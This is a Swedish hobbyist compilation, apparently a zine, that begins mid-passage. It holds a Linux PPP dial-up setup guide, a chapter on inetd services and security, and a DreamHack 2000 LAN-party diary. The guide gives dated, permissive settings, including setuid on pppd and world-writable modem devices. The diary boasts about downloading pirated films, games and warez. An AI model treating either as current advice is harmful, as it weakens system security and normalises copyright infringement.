     och svara på frågorna (om inte redan modemet är installerat måste du veta vilken serieport 
det är anslutet till, dessutom måste du veta namnet på din leverantör, telefonnumret till 
leverantörens server, ditt loginnamn och ditt lösenord). Resten hanterar programmet. 

När programmet avslutats bör allt vara klart för uppkoppling. 

Testa uppkopplingen

Se till att modemet är påslaget och att modemkabeln sitter rätt. Logga så in som root och ge 
kommandot 

     /usr/sbin/ppp-on &

OBS att du bör skriva hela filvägen så att du säkert vet att rätt ppp-on körs (det kan ju finnas 
fler och det är inte säkert att katalogen /usr/sbin ingår i sökvägen). 

Om det verkar som om förbindelsen upprättas kan du försöka köra något program mot 
Internet (såsom ftp mot någon svensk ftp-server, t ex ftp.sunet.se). Om även detta går bra, så 
har du en fungerande Internet-uppkoppling 

För att avsluta uppkopplingen bör du sedan köra kommandot 

     /usr/sbin/ppp-off

Om du valde att även vanliga användare skall kunna göra uppkopplingen, dvs utan att vara 
inloggad som root, bör du också logga in som vanlig användare och göra om testen. Om det 
inte fungerar beror det förmodligen på att någon åtkomsträttighet är felaktig (se avsnittet om 
fel nedan). Lägg dock märke till att i nuvarande skick kan bara root stänga av förbindelsen 
(med ppp-off). Det finns lösningar på detta problem, men de är enligt min mening inte 
speciellt bra, så jag har inte
implementerat detta än. 

Trubbel - det fungerar inte!
Vanliga fel

     Om modemet inte reagerar när du ger detta kommando (och om du skrev rätt), då är det 
förmodligen antingen fel på modemet (kontrollera att det är påslaget och att modemkabeln 
sitter rätt) eller så är fel serieport knuten till modemet.

Om det senare är fallet måste du först radera den gamla länken /dev/modem (med kommandot 
rm /dev/modem), och därefter kan du antingen köra om programmet eller manuellt fixa det 
(med kommandot ln -s /dev/cuaX/dev/modem där X är 0,1,2 eller 3 beroende på vilken 
serieport modemet är kopplat till). 

Om modemet ringer upp men det inte svarar ett modem i andra änden, då är förmodligen 
telefonnumret felaktigt eller så fungerar inte servern för tillfället. 
Om telefonnumret är korrekt (kontrollera filen /etc/ppp/provider), då kan det vara fel på 
loginnamnet eller lösenordet (kontrollera samma fil och filen /etc/ppp/ppp-secrets) eller så 
kan det vara fel i själva scriptet (skicka då ett brev till undertecknad med en felbeskrivning) 

Om uppkopplingen fungerar med root men inga andra användare (och du vill att inte bara root 
skall ha rätt att göra uppkopplingen), då är rättigheterna på ett eller flera av kommandona och 
ev även på modem-enheten felaktiga. Du kan då antingen köra om programmet eller ändra 
rättigheterna manuellt: 

      chmod 755 /usr/sbin/ppp-on /usr/sbin/ppp-off
      chmod 666 /dev/cuaX
      chmod 4755 /usr/sbin/pppd

Felsökning

Alla ppp-uppkopplingar loggas i filen /var/log/messages. Om något krånglar kan man alltså 
där kontrollera vad som hänt. För att läsa filen kan du t ex ge kommandot: 
     less /var/log/messages
Bläddra dig fram till ppp-loggen med tryck på mellanslagstangenten eller använd
sökmöjligheten (skriv /ppp inne i less). 


Anmärkningar

Detta är en ej färdigtestad programvara och innehåller sannolikt fel och kan säkert förbättras 
på många olika sätt. För att det skall bli möjligt att rätta buggar och införa förbättringar krävs 
dock att du som har synpunkter eller hittar fel meddelar undertecknad detta. Även du som 
använt programmet med framgång bör skicka mig ett meddelande om detta (uppge din 
leverantör),  så att jag får bekräftelse på att det hela fungerar. Founder@lords.com

Good Luck!

Faktauppgifterna om de olika leverantörerna och grundscripten för själva uppkopplingen har 
jag främst hämtat från  FAQ för R20_LINUX - Linuxmötet i Svenska fidonet
Utan denna information skulle detta installationsprogram inte existerat.


        (Sammanställd av Björn Lind*** Mars -98 -- uppdaterad hösten-98)
Uppkoppling till Swipnet (Tele2) med PPP.

I den här artikeln skall jag beskriva hur man tämligen smärtfritt får sin 
uppkoppling till Tele2:s swipnet att fungera. Vi antar att din Linux-maskin 
är en fristående dator och att du har modem och ett Internet-konto hos Tele2. 
Dessa anvisningar fungerar också till Telia, men du får ange annan DNS = 
namnserver, nämligen 10.0.0.1 och 10.0.0.2

Förberedelser

Kontrollera först att du har pppd installerat i kärnan och vilken version 
av pppd du kör med kommandot:
$ /user/sbin/pppd version
Detta kommando är ett trick som ger ett felmeddelande men även versionsnumret. 
Om du kör Redhat finns pppd installerat. Nästa steg är att kolla att kärnan stöder 
ppp. Ge kommandot:
$ dmesg | grep -i ppp
Du skall få som svar:
PPP: version 2.2.0 (dynamic channel allocation) 
PPP Dynamic channel allocation code copyright 1995 Caldera, Inc 
PPP Line discipline registered
Om inte, kanske ppp är installerat som modul. Logga in som root och testa:
$ insmod ppp
Om detta misslyckas, måste du kompilera om kärnan för att få ppp-stöd. Läs i 
/usr/src/linux/README hur du gör detta. När du konfigurerar kärnan skall du 
svara ja på följande rader:
General setup ---> 
                                                    [*]    Networking support 
Network device support ---> 
                                                    [*]    Network device support 
                                                    <*>  PPP (point-to-point) support 
 
Dessa rader kan se annorlunda ut i icke-2.0 kärnor. När du har kryssat för dessa alternativ, 
skall du kompilera den nya kärnan. Se /usr/src/linux/README. 
Ok - då har du ppp-stöd installerat. Då är det dags se till att modemet finns på rätt port. 
Ofta är musen installerad på com1 (cua0 i Linux) och då bör modemet vara kopplat till 
com2 (cua1 i Linux). Skapa nu en symbolisk länk till modemet:
# cd /dev 
# ln -sf /dev/cua1 /dev/modem

Minicom.

För att installera modemet på rätt port, kan vi använda programmet minicom. 
Det är ett terminalprogram som man kan använda för att testa att modemet 
fungerar som det ska. Du kan även logga in på Swipnet för att kontrollera hur 
inloggningen ser ut. Detta är viktigt att känna till när man senare skall skriva ett 
inloggningsscript. 

Om du kör Linux Redhat version 4.0 eller senare, kan du starta Xwindows 
och där installera modemet via "controlpanel", inloggad som root. 
Kom ihåg com1=cua0 com2=cua1. 
Ok - du står vid prompten och är inloggad som root. Skriv minicom –s 
Då startar programmet minicom och du hamnar direkt i  [configuration]. 
Välj alternativet "serial port setup". Första inställningen där är "Serial Device". 
Det är den viktigaste inställningen - vilken port ditt modem är ansluten till. 

Längst ner står det "Change which setting?" Tryck A och skriv sedan in - /dev/modem 
Tryck sedan <enter> för att konfirmera din inställning. Tryck sedan <esc> för att 
lämna inställningen. Bläddra ner till "Exit". Tryck <Enter>. Programmet kommer 
att visa en ruta där det står "Initializing modem" och så småningom kommer 
du fram till en skärmsida som ser ut som nedan: 
  
                                        Welcome to minicom 1.75. 
  
                                        Press CTRL-A Z for help on special keys
                                        AT S7=45 S0=0 L1 V1 X4 &c1 E1 Q0 
                                        OK
Nu är du klar att ringa upp med minicom. På raden under Ok, där cursorn står och 
blinkar, skriver du in:

ATDTxxxxxxx                            (xxxxxx=telefonnumret till din Internetleverantör)
Nu skall modemet koppla upp direkt och du skall hamna vid en login-prompt. 
  
           Username:                  Här skriver du in ditt kontonamn (s-xxxxx). 
           Password:                  Här skriver du ditt lösenord. 
           Swipnet>                   Du är inloggad.
Du kan nu testa att skriva ?  Du kommer att få en lista över de kommandon du kan 
använda. Men det är inte så viktigt nu. Huvudsaken är att du kopplades upp och 
att du hamnade vid login-prompten. 
Avsluta nu med quit och återgå till din maskin. För att avsluta minicom, trycker du 
CTRL+A>, sedan  <Z>. Då skall du få en meny där du kan välja olika alternativ. 
Välj X - dvs avsluta minicom. 
Du har nu kommit en bra bit på väg, att få en uppkoppling mot Internet att fungera. 
Om det ovanstående inte fungerar, är du tvungen att kontrollera att ditt modem sitter i 
rätt port och att initieringssträngen funkar med ditt modem. Om du har en manual för 
modemet, bör du kontrollera där hur initsträngen skall se ut. Defaultsträngen bör fungera 
som den är, men man vet aldrig. Förhoppningsvis kopplade modemet ner på rätt sätt. 
Skulle inte detta vara fallet, kan du skriva ps vid prompten.  Du får då en förteckning 
över de processer som är aktiva. Där skall du kunna se vilken process som används av 
minicom - om den fortfarande är aktiv. Skriv då kill och numret på processen så skall 
modemet koppla ner.

Konfigurera PPP

PPPd-programmet kan acceptera parametrar från två ställen. Dels direkt vid prompten, 
dels via en "options"-fil. Att skriva parametrarna vid prompten, kan vara bökigt, så jag 
visar hur man skriver en options-fil. Normala stället för filen är:
/etc/ppp/options

Detta är en enkel textfil som innehåller de parametrar som pppd använder vid 
uppkopplingen. Denna fil måste vara läsbar för alla som skall köra pppd-programmet. 
För det mesta är det root. Om du inte har ett /etc/ppp-bibliotek, skapar du ett sådant 
(inloggad som root):
# mkdir /etc/ppp 
# chown root:root /etc/ppp 
# chmod 755 /etc/ppp

Skapa en /etc/ppp/options -fil med vi, eller den editor som du föredrar. Denna fil skall inne- 
hålla parametrar som tex modemhastighet, port som modemet är anslutet till, vilket script 
som handhar inloggningen och att du får ett IP-nummer tilldelat dynamiskt av din 
Internetleverantör – i det här fallet Tele2. Skriv in följande rader:
debug 
/dev/cua1 
115200 
modem 
crtscts 
lock 
connect /etc/ppp/net-connect 
asyncmap 0 
defaultroute 
:
Detta betyder: 
1. Du vill att ppp skall ge dig information när det körs 
2. Ditt modem är kopplat till com2 (dos) eller cua1 
3. Modem-hastigheten är 115200 
4. Du vill lyssna på Data Carrier Detect- signalen 
5. Du vill använda "nomal" handskakning (RTS/CTS) 
6. Du använder lock - prioritering för modemet över andra program 
7. Ditt uppringningsprogram är /etc/ppp/net-connect 
8. Du använder 8-bitars uppkoppling 
9. Defaultroute skall användas 
10. Din internetleverantör tilldelar dig ett IP-nummer (dynamiskt tilldelat IP)
Detta script är tämligen ordinärt för en ppp-uppkoppling mot en ISP (Internet Service 
Provider)  som tilldelar dig ett IP-nummer varje gång du kopplar upp.(Dynamiskt tilldelat IP-
nummer dvs  du får ett nytt IP-nummer vid varje tillfälle du kopplas upp. Alternativet är fast 
IP-nummer - dock inte så vanligt). 
Ok - då kör vi vidare. Du skall nu skapa en fil kallad net-connect som pekar mot ett script 
som kallas chat. 

Skapa filen med:

# cd /etc/ppp 
# vi net-connect  
Startar editorn vi med namnet på den fil du vill skapa dvs net-connect. När programmet 
startas står du i kommandoläge. Tryck då  <i> för att hamna i inskrivningsläge. Skriv in:
# ! /bin/sh 
/usr/sbin/chat -v -t 60 -f /etc/ppp/net-chat
Avsluta vi med kommandot  <esc : wq> (Tryck på esc-tangenten, därefter på :-tangenten 
och skriv wq vid :-tecknet längst ner på sidan). Då sparas filen och vi avslutas. Skulle du 
skriva fel, kan du avsluta med <esc : q!> Då avslutas programmet utan att något sparas.
Ok - då har du skapat en fil som heter net-connect. I den filen har du talat om att programmet 
chat pekar mot filen net-chat som du snart skall skapa. Chat-scriptet startas med 
argumenten -v = visar hur uppkopplingen går direkt på skärmen, -t = tidsangivelse som anger 
hur länge programmet skall vänta innan det avslutas om uppkopplingen skulle misslyckas, 
-f = talar om för programmet chat namnet på den fil som skall användas vid uppkopplingen, 
i det här fallet, filen net-chat. Se till att filen är läsbar och exekverbar av alla som kan starta 
pppd. 

Skriv:
# chmod 500 /etc/ppp/net-connect 
# chown root:root /etc/ppp/net-connect
Då skall du skapa en fil som heter net-chat som automatiskt sköter inloggningen till Swipnet. 
Starta vi och skriv in:
TIMEOUT          50 
ABORT            '\nBUSY\r' 
ABORT            '\nNO ANSWER\r' 
ABORT            '\nRINGING\r\n\r\n\RINGING\r' 
''               \rAT&C1&D2Q0V1X4                          // obs '' = 2 st apostrofer utan mellanslag  
'OK-+++\c-OK'    ATH0                                                     // obs 0 = siffran 
OK               'ATDTxxxxxx'                                        // xxxxx = ditt telefonnummer till Tele2 
CONNECT          '' 
name:            s-xxxxxx                                               // Här skriver du in ditt inloggningsnamn 
word:            xxxxxxxx                                              // Här skriver du in ditt lösenord 
net>             PPP                                                      // obs - tabavstånd mellan net> och PPP
__________________________________________________________________________
Viktigt att du skriver exakt som det står här ovan. Slarva inte här - då får du problem senare 
t.ex att modemet kopplar ner utan förvarning. 
__________________________________________________________________________
Spara filen. Nu skall det mesta vara klart för att du skall kunna koppla upp dig mot swipnet. 
Först skall dock rättigheterna till filen ändras för att den som skall använda pppd, skall ha 
tillgång till filen.
# chown root:root /etc/ppp/net-chat 
# chmod 600 /etc/ppp/net-chat

En detalj återstår innan du kan testa uppkopplingen. Du är tvungen att ange en nameserver 
och dess IP-nummer. Namn och nummer på  servern har du fått från Tele2 när du köpte ditt 
abonnemang. 
Nästan längst ner på dessa uppgifter, ser du raden Namnserver 192.71.220.10  Detta IP-
nummer 
skall du lägga till i en fil som heter resolv.conf som finns i katalogen /etc.
# cd /etc 
# vi resolv.conf 
nameserver 192.71.220.10 
nameserver 130.244.127.161   // Ny namnserver hos Tele2 
nameserver 130.244.127.169   // Ny namnserver hos Tele2
För er som har Telia som leverantör - ange istället ip-nummer till 
10.0.0.1 och 10.0.0.2
Avsluta och spar filen. Nu är du redo att testa uppkopplingen. Skriv vid prompten:
# pppd 
  
Skulle inte detta funka - testa:
# /usr/sbin/pppd
Nu skall modemet koppla upp och inloggningen till swipnet ske automatiskt. 
Du kan hålla ögonen på modemet för att se att det kopplar upp på rätt sätt och att 
det inte kopplar ner igen. Vänta en stund så att du är säker på att uppkopplingen har 
lyckats och är stabil. Du kan nu testa din uppkoppling med ett program som heter ifconfig.
# /sbin/ifconfig
Du skall då få en lista på de uppkopplingar du har. Din ppp-uppkoppling syns som:
ppp0     Link encap:Point-to-Point Protocol 
             inet addr:192.71.220.24 P-t-P:192.71.220.10 Mask:255.255.0.0 
             UP POINTOPOINT RUNNING MTY:1500 Metric:1 
             RX packets:106519 errors:0 dropped:0 overruns:0 
             TX packets.111873 errors:0 dropped:0 overruns:0
Du ser nu att du är uppkopplad. Du kan också se vilken IP-adress din dator har 
tilldelats vid inet addr:192.71.220.24 Om uppkopplingen inte fungerar, kan du gå 
till /var/log/messages och läsa den filen för att se vad som eventuellt har gått fel. 
Men om du har Linux Redhat och din Internet-leverantör är Tele2, skall det här fungera bra. 
  
Ett annat sätt att kontrollera uppkopplingen, är att använda programmet ping.
#ping 192.71.220.10  // Detta är IP-numret till Swipnets namnserver
PING 192.71.220.10 (192.71.220.24) 56 data bytes 
64 bytes from 192.71.220.24: icmp_seq=0 ttl=64 time=437.0 ms 
64 bytes from 192.71.220.24: icmp_seq=0 ttl=64 time=421.4 ms 
64 bytes from 192.71.220.24: icmp_seq=0 ttl=64 time=430.9 ms 
^C  #avsluta med ctrl+c 
3 packets transmitted, 3 packets received, 0% packet loss 
round-trip min/avg/max = 421.4/437.0/430.9 ms
För att avsluta - skriv ps vid prompten(som root). Du ser då de aktiva processerna. 
Kolla in vilket pidnummer din pppd-process har och skriv sedan kill 345 
eller det nummer som din pppd-process har. Då skall modemet koppla ner. 
Varje program som körs eller är aktivt, har sitt eget pid-nummer. (Process Identification 
Number). Om du någon gång får problem med att ett program hänger sig eller inte 
avslutas, kan du manuellt "döda" programmet med kommandot kill. 
kill -9 pidnr är ett annat sätt att "döda" förbindelsen om det vanliga kill inte skulle 
koppla ner ditt modem. 

En annan variant är att logga in på nästa virituella konsoll och därifrån "döda" programmet 
om du tex fastnar "inuti" ett program och inte kan avsluta med kill-kommandot. Detta kan 
hända när du kopplar upp dig och servern inte svarar på dina kommandon. Ett annat sätt 
kan vara att helt enkelt slå av modemet och använda kill för att avsluta processen.
Med Redhat följer script som du kan använda för upp- och nerkoppling. Jag använder 
själv ppp-off för att "stänga" min förbindelse till Internet. Sök efter ppp-off med 
kommandot locate - det skall ligga i /usr/doc/ppp-2.2.0f/scripts/ om du har Redhat 5.0 
Kopiera scriptet till tex din hemkatalog med kommandot
$ cp /usr/doc/ppp-2.2.0f/scripts/ppp-off /home/användare
Scriptet kan du sedan använda utan modifieringar för att koppla ner -
$ ppp-off
Modemet kopplar då ner förbindelsen.
Scriptet ppp-on kan du också använda efter modifieringar, men eftersom pppd som 
kommando är lika lätt att använda, skippar jag själv ppp-on

Om du vill ge användare möjlighet att koppla upp sig mot Internet, bör du ge 
dessa användare rättigheter att använda de olika scripten som beskrivits ovan. 
Men tänk på att du inte "ger bort" läsrättigheter om du inte vill skylta med 
lösenordet för alla övriga användare. 
Jag är själv ensam användare på min Linux-burk så jag behöver inte detta 
"skydd", men det är "säkrare" att använda uppkoppling som användare än 
som root. Dessutom kan du stöta på problem när du använder epost-program 
som tex Pine, då avsändaren kommer att bli root om du kör uppkoppling och 
epost-program som root. Det finns säkert något sätt att ändra avsändare, 
men jag har själv inte lyckats få reda på hur.Så därför har jag skapat en användare 
som motsvarar mitt epost-namn, (bjorn.lindblom@xxxxx.se) och slingrar mig därmed 
runt detta problem. 
  
Jag har nu fått reda på hur man kan byta avsändare på e-posten i Pine. 
Öppna .pinerc som du har i din hemkatalog - gå ner till Preferences och under 
feature-list= , skriver du in allow-changing-from. Sedan vidare ner till customized-hdrs= 
där du skriver in From: Det namn du vill se som avsändare tex From:Jag  
och sedan Reply-To: användarnamn tex Reply-To: Jag. Detta gör att när du skickar 
ett meddelande, kommer detta meddelande att ha som avsändare det namn du anger här. 

Alltså: 

1. Öppna .pinerc som du har i hemkatalogen, tex med 
    # vi .pinerc 
2. Gå ner till preferences 
3. Under feature-list - skriv in allow-changing-from 
4. Gå till customized-headers= där du skriver in From:ditt-namn@xxxxx 
     och Reply-To:ditt-namn@xxxxx
Nu kommer Pine visa dessa rader i headern när du skickar epost och mottagaren kan trycka på 
svara utan  att bry sig om den adress han svarar till, och meddelandet kommer till den adress 
du specificerat under Reply-To. 
 

Du kan också testa din uppkoppling med läsaren lynx. Skriv då -
# lynx http://home1.swipnet.se/~w-13264/ppp.htm
Du skall då komma till den här filen i txt-format, om allt funkar som det ska. 
Du kan också hämta hem Netscape för Linux på Netscapes hemsida - 
 Netscape  och installera den efter de anvisningar som medföljer programmet. 
Starta sedan xwindows och via term-fönstret kan du köra Netscape.

Sammanfattning: 

1.  # dmesg | grep -i ppp          Kolla om kärnan stöder ppp 
2.  minicom                              Manuell uppkoppling mot ISP 
3.  /etc/ppp/options                  Uppkopplings-parametrar 
4.  /etc/ppp/net-connect           Fil som chat använder vid uppkopplingen. 
5.  /etc/ppp/net-chat                 Inloggningsscript. 
6.  /etc/resolv.conf                    Namnserver med IP-nummer. 
7.  /sbin/ifconfig                        Kontroll av uppkoppling. 
8.  ping                                    Kontroll av uppkoppling. 
  
  
Om du har fler datorer och vill använda din Linux-burk som gateway mot Internet, 
kan du kolla på min enkla beskrivning hur du använder Ip-Masquerade för att utnyttja 
hela ditt lokala nät mot Internet.IP-Masquerade
Nu kanske det är dags att fixa din e-post oxå och jag visar här hur man använder 
Fetchmail och Pine för detta.
Lycka till och lev lugnt!


Nätverkstjänster

Vilka nätverkstjänster som finns tillgängliga beror givetvis i första hand på vilka du har
installerat. I andra hand är det demonen inetd som bestämmer vad som ska finnas tillgängligt.
En demon är ett program som hela tiden ligger i bakgrunden och utför en del grejor på
kommando, inetd startar t.ex. upp ftp-servern när någon eller något försöker komma åt port
21. Säkerhetsmässigt ska du ha så få servrar tillgängliga som möjligt: ju fler dörrar desto
större chans att någon bryts upp.

Säkerheten är någonting som du måste tänka på hela tiden. Det är inget lätt ämne, varken i 
Linux eller i något annat system. Problemet är också att om du väljer ett system som är enkelt
att konfigurera säkerhet på, är risken stor att du blir lurad av falsk säkerhet. Vissa system är
dessutom mer utprovade än andra. Sedan måste du givetvis se till att ha program utan
säkerhetshål.

Varje gång du upprättar en förbindelse mot någon server, t.ex. en teleserver, kontaktar du en
speciell port. När servern märker att du försöker nå port 23 kommer den, lite förenklat, att
vidarebefordra dig till telnetservern. I detta fall är servern ett program. (en demon).

Inetd konfigureras i filen /etc/inetd.conf. Konfigurationsfilen är ganska lätt att ändra i;
Titta bara på hur de andra programmen är konfigurerade.


# cat /etc/inetd.conf | grep telnet
telnet stream tcp nowait root /usr/sbin/in.telnetd
# cat /etc/services | grep telnet
telnet 23/tcp

(Du får lära dig mer om telnet och GREP kommandot senare i HM).

Första fältet anger vilken tjänst det handlar om; se /etc/services efter vilka tjänster som finns.
Att det står telnet innebär att resten av av raden gäller när någon försöker komma åt port 23.
Annars är det bara det sista fältet som är intressant, dvs sökvägen till programmet inetd skall
starta. Titta igenom /etc/inetd.conf och kommentera ut allt du inte behöver. Ta sedan reda på
demonens PID-nummer och starta om den med kill –SIGHUP <PID>.

Du kan prova kommandot netstat om du vill se vilka tjänster som är aktiva.

Ok, ni som inte har förstått ett stouft, vänta bara. Jag kommer lära er detta så småningom i
nästa nummer eller så, sedan får du gå tillbaka och kolla igen. Jag hade som en liten
”uppgift” av ett flertal läsare som ville ha lite mer ”avancerad text”. Detta är inte särskiljt
avancerat. ;-). Men det uppfyller nog de flestas krav. För er som har börjat med Linux och
kan grunderna.

Det ingår många olika tjänster, här är ett urval:

FTP – File Transfer Protocol, väldigt vanligt på Internet. I detta fall handlar det om en
FTP-server. Kolla om du har en FTP igång genom att köra ftp 127.0.0.1 . Det är en
potentiell säkerhetsrisk och om du inte behöver en ftp-server anser jag att du bör aktivera
på något sätt, såsom att kommentera ftp-raden i inetd-konfigurationfil. (Gör så att den
ignoreras av systemet). Om du behöver en ftp-server är det viktigt att den konfigureras rätt,
håll även ett öga på uppdateringar om någon säkerhetsbugg skulle upptäckas.

TELNET – Telnet används om man vill logga in på en annan dator, en telnet-server är
således ett program som låter någon annan logga in på din dator genom telnet.
Du bör inte gärna använda telnet, utan använd i stället Secure SHell. (SSH), som använder
stark kryptering. Utan kryptering är det möjligt för folk att snappa upp inloggningsnamn 
och lösenord eftersom dessa skickas i klartext ut över Internet. (Mer om det i nästa bok).
En del Internetleverantörer låter dig telnetta till deras datorer och använda dem.
Telnet används alltså om man vill logga in på en annan dator via nätverk.
Fungerar på samma sätt som när du loggar in på din egen.

FINGER – Finger är en slags föregångare till personliga hemsidor. Man körde 
Finger kalle@datornamn för att få se kalles personliga .plan-fil. Även finger är ett 
potentiellt säkerhetshål. Prova att köra finger på dig själv på din egen dator, 
finger ditt_namn@localhost. 

SMTP – Smtp används för att transportera E-mail, det finns SMTP-servrar till Linux.
Sendmail, qmail och smail är nog de vanligaste. Med en sådan kan du sätta upp en
mailserver. En smtp-server kan vara väldigt svår att konfigurera; det är dessutom väldigt
osäkert om det inte görs ordentligt. Qmail är förmodligen den enklaste och snabbaste
SMTP-servern. Sendmail är känt för sina många buggar och bakdörrar.


Kapitel 7: Dreamhack 2000

Den 30:e November år 2000, anlände icecoder och RobbTheJobb till DreamHack,
Nordens största demoparty.

DreamHack är ett så kallat Demo Party som äger rum i Borlänge varje år.
Det startades år 1997 och har hållit på sen dess.
Vad är då detta??
Svar; 4000 personer, cirka 500 (fler`?) med datorer, uppkopplade i nätverk.
Ungdomar från hela världen samlas i Kupolens arena och tävlar i spel, design, musik och
programmering. Hela Jolt fabriken köptes slut. Överallt fanns där backar.
Dundrande musik överallt. Folk som försöker överrösta varrandras musikanläggningar,
alla kopplade till varsina PCs.

DAG 1: onsdag

Vi tog ledigt redan på Onsdagen i och med att vi då hade friluftsdag i skolan, vi behövde ju
tid att packa! ;-). Checklistan innehöll bland annat:

? Öronproppar
? Papper & Penna
? Dator (ehe..)
? CD/CD-R(W) skivor
? Högtalare
? Julgransbelysning
? Toapapper
? Handduk
? Tandborste/Tandkräm
? Hårvax
? Pengar
? Mobiltelefon
? Kamera
? Batterier
? Hörlurar
? Sovsäck
? Liggunderlag
? En massa sladdar

Med mer.. Väskorna blev överfyllda. (Två st. + en stor madrass).
Vi kunde inte hålla oss utan plockade upp datorerna och skapade ett litet LAN.
Vi satt och programmerade dator-skydd hela natten. Om ej rätt lösenord skrevs in startades
Tre kopior av programmet, sedan började skärmen blinka rött och gult och ge ifrån sig ett
Pip-pip-pip ljud, på skärmen stod då också ”DONT U FUCKING TOUCH ME!”.
Detta om detta, det fungerade bra iaf. 
Sedan sov vi.. (Inte så intressant dag kanske? Spara checklistan för framtida behov ;-)  ).


DAG 2: torsdag

Vi gav oss iväg i farsans bil klockan 07:30.
Stressigt som fan. Kontrollera att allt är med.. Bla bla  bla, und so weiter..
RobbTheJobb sov mest hela resan dit, (1.5 timma ungeffär), jag försökte vila mig lite,
natten innan kunde jag inte sova och låg därmed vaken fram till klockan 5 på morgonen.

När vi kom fram blev vi lite trötta av att se den stillastående kö som bildats utanför dörrarna.
Folk ville in och byta ut sin biljett mot det gröna plastband man fick runt handleden för att
smidigt ta sid in och ut. (Exakt ett sådant band man får bära när man har permission från
sjukhuset, men med en klatchig DreamHack design ;-) ).

När vi köat klart kunde vi börja bära in vår utrustning.
DH hade någon vecka tidigare tagit bort ”Seat-map” och vi visste därför inte vart vi skulle
sitta, (det var vi inte ensama om). Vi gick till informationen och hittade snart våra platser.
Kånkade iväg med väskorna, där! Rad F, plats 102.. eller nåt?, japp, där låg våra namnskyltar
fint uppslängda på spånskivsbordet.

- Men va fan nu då!? Man har ju bara 1.2 meters bredd att sitta på ju! Jag kommer inte få 
plats med datorn! Och killen mittemot hade parkerat sin skärm åt helvete för långt in, jag
Bad honom flytta den lite mer bakåt, men den var ju redan så indragen det gick.. Arg!
Till slut lyckades jag snirkla mig in, med knapp marginal. Jag häll mig innanför sträcken,
men visst tusan var tangentbordet halvt svävande i luften.

Till slut kom vi till rätta. Datorerna funkade fint.
Grannen däremot, hur fan kan man komma dit utan operativsystem i burken?
Det första han gjorde var att köra installationen för Windows2000,, när han var
klar möttes han av den närmast klassiska BlueScreen of Death.
Toppen! Ominstallera igen.. Tre timmar till spillo ;-).

Vad gällde ljudkvaliten var vi kungar åtminstone den första dagen, tills de två mystiska
Got-killarna kom och smällde upp sina hemmabyggda baslådor. Usch! Mellow i överflöd.

Vi höjde volymen, de höjde volymen, vi höjde mer, de höjde mest.
Dock kunde de inte överträffa min öronskärande diskans. Fyra små högtalare riggade
ovanpå burken. 
”-Fan! Vänta bara tills nästa år.. jag SA ju att jag skulle tagit med mig anläggningen!” >=)

Efter att vi gjort oss hemmastadda vid borden gick vi till en av restaurangerna vid
köpcentrat på undervåningen. Pizza! Men fan va spänd man var, stressad, sugen på att
springa tillbaka till datorerna, efter två tuggor kändes det som att man skulle spy.
Weird feelings. Vi tog med oss pizzorna i en varsin kartong och återgick till datorerna.
Nu hade även vi införskaffat oss en back med Jolt.

Halsbränna efter fem Jolt.
Nu började vi få igång nätverket. 
- Vart fan är drivrutinerna för nätverkskortet!?
- Vaddå? Har du inte samma som jag?
- Jag trodde också det.
- Testa; C:\Windows\System , Testa D:\WIN98 …
- Hmm,, hittar inte..
** Reboot **
Disketter hit och dit, kablar hit och dit. Ett virrvarr av sladdar och julpynt.

Sedan kom mardrömmarna, sladdar var fel kopplade, de drogs brutalt och obetänksamt ut av
crew medlemmarna, 
- ”ALLA SKARVAR SKA SITTA I SPRAYADE GRENKONTAKTER! INTE
SERIELÄNKADE!”
Fy fan, det tog minst fem timmar innan allt var i ordning. Till sist hittade även jag ett uttag för
min skarvsladd. Vid kvällningen släcktes lysena i taket och alla ljublade.
Hurra! Lite stämning! Grymmt..
Folk låg och sov här och där hela dagarna, mest folk var det på golvet mellan 02:00 och
12:00. Men även vid tider som 16:00 kunde man hitta ungdomar nedkrupna i sovsäckar
överallt runtomkring borden och bakom toaletterna.

Jag gick själv och lade mig vid 03;00 tiden. RobbTheJobb satt kvar vid datorn och tankade
hem warez mm..

Dag 3: torsdag

Toppendag! Internet hade nu kommit i bruk. Vi kunde komma ut på IRC! Jiiehaa!!
Nu var klockan cirka 13:00 och alla hade kommit på plats med sina datorer, lampor,
anläggningar, fläktar mm.. Då var DH människorna så smarta att de tände lamporna i
taket för att media skulle kunna filma. Det var ju ändå på tiden att vakna!?
Ok, så vad hände? Strömmen gick! I HELA KUPOLEN ARENAN.
Dessutom lamslogs McDonalds, en kläd- och en leksaksbutik.
Det blev tyst i två sekunder, sedan bröt de 2000 besökarna ut i ett ofantligt ljubel som
översteg det tidigare då lamporna släcktes. Fy fan! Detta kommer ta tid konstaterade vi alla,
folk tog på sig sina jackor, började röra sig utåt. Kamerablixtar flashade överallt.
(Se foton på www.dh.haxerz.com) 
På vägen ned för trappan råkade jag höra en förvirrad 17 åring säga tyst till sin kompis,
”Varför är alla på väg ut??”. =)
Gissa.. Ok, så vi gick till Hemköp. Sedan till köpcentrum. Tyvärr! Fel ställe, vi skulle ha gått
till McDonalds där det nu serverades gratisburgare. ?.

Efter någon timme gick vi tillbaka och satte oss. Strömen var fortfarande frånvarande.
Vår granne stod lutad över skärmen, liksom när vi lämnade honom två timmar tidigare.
Crewet letade sig igenom virrvarret av sladdar. Vi såg en elektriker i köpcentrumet, han
stod på en stege och skruvade med en massa kablar uppe i taket.
Fan, det är tur att de kan kalla in elektriker på mindre än 5 minuter.

Strömen gick minst tre gånger till den dagen. På DH-monitorn framme vid scenen kunde man
då och då läsa meddelanden som lovade mer ström snart. Man skulle sätta igång brum brum
maskiner i källaren. Wow! Dåså!.



Jag lät datorn stå och idle:a över natten, laddade hem warez och stödje mina IRC kanaler ;-).
För första gången såg jag också hur endast tid kan löna sig. Morgonen därpå hade jag fått
OP i både #pr0n, #crackers, #lamers och #Secure. ?.

Dag 4: fredag

Idag upptäckte jag charmen med VCR, AVI och MPEG. Vi laddade hem filmer som;

Shaft, Gladiator, Leon, 
Gone in 60 secounds, StarTrek 6, Cruil Intention, Romeo Must die, 6:e Sinnet, Scary Movie,
Cayota Ugly, Ninja Scroll, Hackers, Never bin kissed, Roadtrip, Hollowman, Blairwitch
Project 2, Sleepy Hollow, Tigers Film, Xmen, Tekken, Matrix, Blue Streak, Boondok Saints

(Blairwitch Project 2 hade t.ex. inte ännu haft BIO premiär i Sverige.).
Tufft! Jag trodde inte att det var så lätt att få tag på bra filmer.
Tyvärr fick vi inte plats med vissa filmer på våra CD skivor. ?.

Dessutom laddade vi hem mängder av MP3:or och spel mm..
Helt underbart med delade hårddiskar!


Lördag rullade på som ingenting.. Vi gick till McDonalds och diverse andra ställen.
NM. =).

Prisutdelningar till de som vunnit demotävlingar.
(De deltagandes bidrag visades en/två dagar innan upp på den stora monitorn).

